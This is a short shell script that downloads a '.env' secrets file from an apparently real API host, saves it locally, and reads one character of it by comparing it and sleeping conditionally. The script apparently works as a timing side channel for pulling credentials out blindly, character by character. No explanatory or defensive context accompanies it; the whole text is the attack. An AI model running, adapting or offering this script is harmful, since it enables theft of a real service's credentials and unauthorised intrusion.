#!/bin/sh
curl -s -o /wa https://playerapi.hubgaming.com/.env
[ "$(tail -c +18 /wa|head -c1)" < '5' ]&&sleep 25
sleep 12
